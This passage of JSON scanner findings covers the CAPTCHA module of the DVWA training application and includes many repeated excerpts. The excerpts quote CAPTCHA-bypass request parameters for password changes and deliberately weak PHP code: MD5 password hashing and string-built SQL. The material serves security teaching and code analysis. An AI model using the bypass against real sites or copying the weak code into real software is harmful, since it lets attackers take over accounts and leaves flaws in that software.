        "excerpt": "\t\t\tmove on to the next screen where the password is actually updated. By submitting the new password directly to the change page, the user may bypass the CAPTCHA system.&lt;/p&gt;\n\n\t\t&lt;p&gt;The parameters required to complete this challenge in low security would be similar to the following:&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?step=2&amp;password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;The developer has attempted to place state around the session and keep track of whether the user successfully completed the\n",
        "startLocationLine": 30,
        "startLocationColumn": 83,
        "endLocationLine": 30,
        "endLocationColumn": 91
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;p&gt;The developer has attempted to place state around the session and keep track of whether the user successfully completed the\n\t\t\tCAPTCHA prior to submitting data. Because the state variable (Spoiler: &lt;span class=&quot;spoiler&quot;&gt;passed_captcha&lt;/span&gt;) is on the client side,\n\t\t\tit can also be manipulated by the attacker like so:&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?step=2&amp;password_new=password&amp;password_conf=password&amp;passed_captcha=true&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;High Level&lt;/h3&gt;\n\t\t&lt;p&gt;There has been development code left in, which was never removed in production. It is possible to mimic the development values, to allow\n",
        "startLocationLine": 38,
        "startLocationColumn": 60,
        "endLocationLine": 38,
        "endLocationColumn": 68
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;p&gt;The developer has attempted to place state around the session and keep track of whether the user successfully completed the\n\t\t\tCAPTCHA prior to submitting data. Because the state variable (Spoiler: &lt;span class=&quot;spoiler&quot;&gt;passed_captcha&lt;/span&gt;) is on the client side,\n\t\t\tit can also be manipulated by the attacker like so:&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?step=2&amp;password_new=password&amp;password_conf=password&amp;passed_captcha=true&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;High Level&lt;/h3&gt;\n\t\t&lt;p&gt;There has been development code left in, which was never removed in production. It is possible to mimic the development values, to allow\n",
        "startLocationLine": 38,
        "startLocationColumn": 83,
        "endLocationLine": 38,
        "endLocationColumn": 91
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI016700",
        "ruleName": "Data: Sensitive (Account)",
        "ruleDescription": "Data: Sensitive (Account)",
        "pattern": "\\b(registration|membership|acctnum|accountnum|accountnumber)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.UserAccount"
        ],
        "sample": "registration",
        "excerpt": "\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;A &lt;?php echo dvwaExternalLinkUrlGet( &#39;https://en.wikipedia.org/wiki/CAPTCHA&#39;, &#39;CAPTCHA&#39; ); ?&gt; is a program that can tell whether its user is a human or a computer. You&#39;ve probably seen\n\t\t\tthem - colourful images with distorted text at the bottom of Web registration forms. CAPTCHAs are used by many websites to prevent abuse from\n\t\t\t&quot;bots&quot;, or automated programs usually written to generate spam. No computer program can read distorted text as well as humans can, so bots\n\t\t\tcannot navigate sites protected by CAPTCHAs.&lt;/p&gt;\n\n\t\t&lt;p&gt;CAPTCHAs are often used to protect sensitive functionality from automated bots. Such functionality typically includes user registration and changes,\n\t\t\tpassword changes, and posting content. In this example, the CAPTCHA is guarding the change password functionality for the user account. This provides\n",
        "startLocationLine": 10,
        "startLocationColumn": 69,
        "endLocationLine": 10,
        "endLocationColumn": 81
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI016700",
        "ruleName": "Data: Sensitive (Account)",
        "ruleDescription": "Data: Sensitive (Account)",
        "pattern": "\\b(registration|membership|acctnum|accountnum|accountnumber)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.UserAccount"
        ],
        "sample": "registration",
        "excerpt": "\t\t\t&quot;bots&quot;, or automated programs usually written to generate spam. No computer program can read distorted text as well as humans can, so bots\n\t\t\tcannot navigate sites protected by CAPTCHAs.&lt;/p&gt;\n\n\t\t&lt;p&gt;CAPTCHAs are often used to protect sensitive functionality from automated bots. Such functionality typically includes user registration and changes,\n\t\t\tpassword changes, and posting content. In this example, the CAPTCHA is guarding the change password functionality for the user account. This provides\n\t\t\tlimited protection from CSRF attacks as well as automated bot guessing.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n",
        "startLocationLine": 14,
        "startLocationColumn": 129,
        "endLocationLine": 14,
        "endLocationColumn": 141
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\tcannot navigate sites protected by CAPTCHAs.&lt;/p&gt;\n\n\t\t&lt;p&gt;CAPTCHAs are often used to protect sensitive functionality from automated bots. Such functionality typically includes user registration and changes,\n\t\t\tpassword changes, and posting content. In this example, the CAPTCHA is guarding the change password functionality for the user account. This provides\n\t\t\tlimited protection from CSRF attacks as well as automated bot guessing.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n",
        "startLocationLine": 15,
        "startLocationColumn": 4,
        "endLocationLine": 15,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\tcannot navigate sites protected by CAPTCHAs.&lt;/p&gt;\n\n\t\t&lt;p&gt;CAPTCHAs are often used to protect sensitive functionality from automated bots. Such functionality typically includes user registration and changes,\n\t\t\tpassword changes, and posting content. In this example, the CAPTCHA is guarding the change password functionality for the user account. This provides\n\t\t\tlimited protection from CSRF attacks as well as automated bot guessing.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n",
        "startLocationLine": 15,
        "startLocationColumn": 95,
        "endLocationLine": 15,
        "endLocationColumn": 103
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;Your aim, change the current user&#39;s password in a automated manner because of the poor CAPTCHA system.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;The issue with this CAPTCHA is that it is easily bypassed. The developer has made the assumption that all users will progress through screen 1, complete the CAPTCHA, and then\n",
        "startLocationLine": 21,
        "startLocationColumn": 42,
        "endLocationLine": 21,
        "endLocationColumn": 50
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;The issue with this CAPTCHA is that it is easily bypassed. The developer has made the assumption that all users will progress through screen 1, complete the CAPTCHA, and then\n\t\t\tmove on to the next screen where the password is actually updated. By submitting the new password directly to the change page, the user may bypass the CAPTCHA system.&lt;/p&gt;\n\n\t\t&lt;p&gt;The parameters required to complete this challenge in low security would be similar to the following:&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?step=2&amp;password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n",
        "startLocationLine": 27,
        "startLocationColumn": 41,
        "endLocationLine": 27,
        "endLocationColumn": 49
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;The issue with this CAPTCHA is that it is easily bypassed. The developer has made the assumption that all users will progress through screen 1, complete the CAPTCHA, and then\n\t\t\tmove on to the next screen where the password is actually updated. By submitting the new password directly to the change page, the user may bypass the CAPTCHA system.&lt;/p&gt;\n\n\t\t&lt;p&gt;The parameters required to complete this challenge in low security would be similar to the following:&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?step=2&amp;password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n",
        "startLocationLine": 27,
        "startLocationColumn": 93,
        "endLocationLine": 27,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\tmove on to the next screen where the password is actually updated. By submitting the new password directly to the change page, the user may bypass the CAPTCHA system.&lt;/p&gt;\n\n\t\t&lt;p&gt;The parameters required to complete this challenge in low security would be similar to the following:&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?step=2&amp;password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;The developer has attempted to place state around the session and keep track of whether the user successfully completed the\n",
        "startLocationLine": 30,
        "startLocationColumn": 60,
        "endLocationLine": 30,
        "endLocationColumn": 68
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\tmove on to the next screen where the password is actually updated. By submitting the new password directly to the change page, the user may bypass the CAPTCHA system.&lt;/p&gt;\n\n\t\t&lt;p&gt;The parameters required to complete this challenge in low security would be similar to the following:&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?step=2&amp;password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;The developer has attempted to place state around the session and keep track of whether the user successfully completed the\n",
        "startLocationLine": 30,
        "startLocationColumn": 83,
        "endLocationLine": 30,
        "endLocationColumn": 91
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;p&gt;The developer has attempted to place state around the session and keep track of whether the user successfully completed the\n\t\t\tCAPTCHA prior to submitting data. Because the state variable (Spoiler: &lt;span class=&quot;spoiler&quot;&gt;passed_captcha&lt;/span&gt;) is on the client side,\n\t\t\tit can also be manipulated by the attacker like so:&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?step=2&amp;password_new=password&amp;password_conf=password&amp;passed_captcha=true&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;High Level&lt;/h3&gt;\n\t\t&lt;p&gt;There has been development code left in, which was never removed in production. It is possible to mimic the development values, to allow\n",
        "startLocationLine": 38,
        "startLocationColumn": 60,
        "endLocationLine": 38,
        "endLocationColumn": 68
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;p&gt;The developer has attempted to place state around the session and keep track of whether the user successfully completed the\n\t\t\tCAPTCHA prior to submitting data. Because the state variable (Spoiler: &lt;span class=&quot;spoiler&quot;&gt;passed_captcha&lt;/span&gt;) is on the client side,\n\t\t\tit can also be manipulated by the attacker like so:&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?step=2&amp;password_new=password&amp;password_conf=password&amp;passed_captcha=true&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;High Level&lt;/h3&gt;\n\t\t&lt;p&gt;There has been development code left in, which was never removed in production. It is possible to mimic the development values, to allow\n",
        "startLocationLine": 38,
        "startLocationColumn": 83,
        "endLocationLine": 38,
        "endLocationColumn": 91
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/high.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\t$pass_new = md5( $pass_new );\n\n\t\t\t// Update database\n\t\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;;\n\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t\t// Feedback for user\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\n",
        "startLocationLine": 30,
        "startLocationColumn": 34,
        "endLocationLine": 30,
        "endLocationColumn": 42
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/high.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Password",
        "excerpt": "\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t\t// Feedback for user\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\n\t\t} else {\n\t\t\t// Ops. Password mismatch\n\t\t\t$html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;\n\t\t\t$hide_form = false;\n",
        "startLocationLine": 34,
        "startLocationColumn": 19,
        "endLocationLine": 34,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/high.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "passwords",
        "excerpt": "\n\t\t} else {\n\t\t\t// Ops. Password mismatch\n\t\t\t$html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;\n\t\t\t$hide_form = false;\n\t\t}\n\n\t} else {\n\t\t// What happens when the CAPTCHA was entered incorrectly\n",
        "startLocationLine": 38,
        "startLocationColumn": 28,
        "endLocationLine": 38,
        "endLocationColumn": 37
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/high.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\t$pass_new = md5( $pass_new );\n\n\t\t\t// Update database\n\t\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;;\n\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t\t// Feedback for user\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\n",
        "startLocationLine": 30,
        "startLocationColumn": 34,
        "endLocationLine": 30,
        "endLocationColumn": 42
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/high.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Password",
        "excerpt": "\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t\t// Feedback for user\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\n\t\t} else {\n\t\t\t// Ops. Password mismatch\n\t\t\t$html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;\n\t\t\t$hide_form = false;\n",
        "startLocationLine": 34,
        "startLocationColumn": 19,
        "endLocationLine": 34,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/high.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;;",
        "excerpt": "\t\t\t$pass_new = md5( $pass_new );\n\n\t\t\t// Update database\n\t\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;;\n\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t\t// Feedback for user\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\n",
        "startLocationLine": 30,
        "startLocationColumn": 14,
        "endLocationLine": 30,
        "endLocationColumn": 109
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/high.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "private_key",
        "excerpt": "\n\t// Check CAPTCHA from 3rd party\n\t$resp = recaptcha_check_answer(\n\t\t$_DVWA[ &#39;recaptcha_private_key&#39; ],\n\t\t$_POST[&#39;g-recaptcha-response&#39;]\n\t);\n\n\tif (\n\t\t$resp ||\n",
        "startLocationLine": 13,
        "startLocationColumn": 22,
        "endLocationLine": 13,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/high.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t\t// CAPTCHA was correct. Do both new passwords match?\n\t\tif ($pass_new == $pass_conf) {\n\t\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t\t$pass_new = md5( $pass_new );\n\n\t\t\t// Update database\n\t\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;;\n\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 27,
        "startLocationColumn": 16,
        "endLocationLine": 27,
        "endLocationColumn": 19
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t}\n\telse {\n\t\t// Check that the current password is correct\n\t\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Do both new password match and was the current password correct?\n",
        "startLocationLine": 41,
        "startLocationColumn": 33,
        "endLocationLine": 41,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
